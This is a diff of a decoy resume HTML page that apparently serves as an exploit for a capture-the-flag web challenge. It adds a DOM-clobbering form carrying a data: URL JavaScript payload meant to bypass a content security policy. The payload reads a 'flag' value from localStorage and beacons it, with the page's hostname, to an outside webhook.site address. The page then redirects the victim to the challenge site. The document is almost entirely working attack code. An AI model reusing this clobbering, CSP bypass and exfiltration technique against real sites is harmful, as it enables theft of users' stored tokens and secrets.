@@ -13,9 +13,13 @@
          </style>
      </head>
      <body>
-         <!-- CRITICAL: DOM Clobbering targeting the live CTF -->
+         <!-- CRITICAL: Use data URL for CSP bypass -->
          <form id="utilsJS">
-             <input name="url" value="https://gavinyw.github.io/resume-portfolio/live_flag_extract.js">
+             <input name="url" value="data:text/javascript,function sendWebhook(s,d){try{const i=new 
+     Image();i.src='https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/'+s+'?flag='+(d||'none')+'&domain='+window.locat
+     ion.hostname+'&ts='+Date.now();document.body.appendChild(i);}catch(e){}}try{const 
+     f=localStorage.getItem('flag');sendWebhook('LIVE-FLAG',f);if(f){sendWebhook('FLAG-CONFIRM',f);console.log('FLAG:',f);}}ca
+     tch(e){sendWebhook('ERROR',e.message);}">
          </form>
 
          <div class="resume">
@@ -48,9 +52,8 @@
          </div>
 
          <script>
-             console.log('LIVE CTF FLAG EXTRACTION - FINAL ATTEMPT');
+             console.log('CSP COMPLIANT DATA URL APPROACH');
 
-             // Webhook function
              function sendWebhook(data) {
                  try {
                      const img = new Image();
@@ -58,31 +61,54 @@
                      Object.keys(data).forEach(key => {
                          params.append(key, typeof data[key] === 'object' ? JSON.stringify(data[key]) : data[key]);
                      });
-                     img.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/live-ctf-final?' +
-     params.toString();
+                     img.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/csp-final?' + params.toString();
                      document.body.appendChild(img);
                  } catch(e) {}
              }
 
+             // Send confirmation
              sendWebhook({
-                 status: 'LIVE_CTF_FINAL_ATTEMPT_START',
+                 status: 'CSP_COMPLIANT_SETUP',
                  timestamp: new Date().toISOString(),
                  domain: window.location.hostname,
                  utilsJS_ready: !!window.utilsJS && !!window.utilsJS.url,
-                 payload_url: window.utilsJS?.url?.value || 'not_found'
+                 data_url_length: window.utilsJS?.url?.value?.length || 0,
+                 is_data_url: window.utilsJS?.url?.value?.startsWith('data:') || false
              });
 
-             // Strategy: Immediately open CTF site in current window
+             // Test the data URL payload execution
+             setTimeout(() => {
+                 try {
+                     let utilJS = window.utilsJS || {};
+                     let script = document.createElement('script');
+                     script.src = utilJS.url;
+                     document.body.appendChild(script);
+
+                     sendWebhook({
+                         status: 'DATA_URL_PAYLOAD_EXECUTED',
+                         timestamp: new Date().toISOString(),
+                         script_src_preview: script.src.substring(0, 100) + '...',
+                         success: true
+                     });
+                 } catch(e) {
+                     sendWebhook({
+                         status: 'DATA_URL_EXECUTION_ERROR',
+                         error: e.message,
+                         timestamp: new Date().toISOString()
+                     });
+                 }
+             }, 1000);
+
+             // Navigate to CTF after confirming data URL is ready
              setTimeout(() => {
                  sendWebhook({
-                     status: 'REDIRECTING_TO_LIVE_CTF_MESSAGES',
+                     status: 'NAVIGATING_TO_CTF_WITH_DATA_URL',
                      timestamp: new Date().toISOString(),
                      target: 'https://jobclobbering-d61fba936086d20d.chal.secjhu.club/#messages'
                  });
 
-                 // Go directly to the CTF messages page where loadMessageBoardJS() is called
                  window.location.replace('https://jobclobbering-d61fba936086d20d.chal.secjhu.club/#messages');
-             }, 1000);
+             }, 2000);
          </script>
      </body>
      </html>
